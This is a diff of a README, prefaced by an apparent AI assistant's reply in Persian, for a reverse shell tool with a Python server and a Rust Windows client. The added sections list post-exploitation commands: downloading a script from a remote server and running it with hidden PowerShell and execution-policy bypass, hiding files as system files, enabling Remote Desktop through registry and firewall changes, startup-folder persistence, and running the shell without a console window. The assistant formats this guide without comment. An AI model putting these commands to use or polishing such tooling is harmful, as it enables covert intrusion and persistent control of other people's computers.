@@ -1,3 +1,14 @@
+
+
+باشه حتماً. خبر خوب این است که گیت‌هاب به صورت خودکار برای هر بلوک کدی که با سه بک‌تیک (```) تعریف شده باشد، یک دکمه «کپی» در گوشه بالا سمت راست آن قرار می‌دهد.
+
+بنابراین، همان متنی که فرستادید کاملاً درست است و این قابلیت را دارد. من فقط یک تغییر کوچک در مسیر فایل `exe` دادم تا آن هم به صورت یک بلوک کد کامل نمایش داده شود و دکمه کپی داشته باشد.
+
+کافی است محتوای زیر را کپی کرده و در فایل `README.md` خود قرار دهید. وقتی این فایل را روی گیت‌هاب آپلود کنید، تمام بلوک‌های کد دکمه کپی خواهند داشت.
+
+---
+
+```markdown
 # 🐍 Reverse Shell (Python Server & Rust Client)
 
 This project is a simple yet effective reverse shell, consisting of a Python server for managing connections and a Rust-based client for the Windows operating system. This tool is designed for **educational purposes and penetration testing**.
@@ -123,3 +134,36 @@ After connecting to a session using the `connect` command, you can send the foll
 ```cmd
 curl -o "script.ps1" "http://your-server.com/script.ps1" 
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "script.ps1"
+```
+
+#### Hide a File Completely
+```cmd
+attrib +h +s "C:\path\to\your\file.ext"
+```
+> To unhide files hidden with this method, you must enable "Hidden items" and uncheck "Hide protected operating system files" in File Explorer's View options.
+
+#### Enable Windows Remote Desktop (RDP)
+```cmd
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+sc config TermService start= auto
+sc start TermService
+netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
+```
+
+#### Copy File to Startup Folder (for Persistence)
+The startup folder path is:
+```
+C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+#### Run Executable Without a Console Window
+```cmd
+start /B reverse_shell.exe
+```
+
+---
+
+## ⚖️ Disclaimer
+
+This tool is developed solely for **educational** and **security research** purposes. Any misuse, illegal, or unauthorized use of this code is the sole responsibility of the user. The developer assumes no liability for any potential misuse.
+```
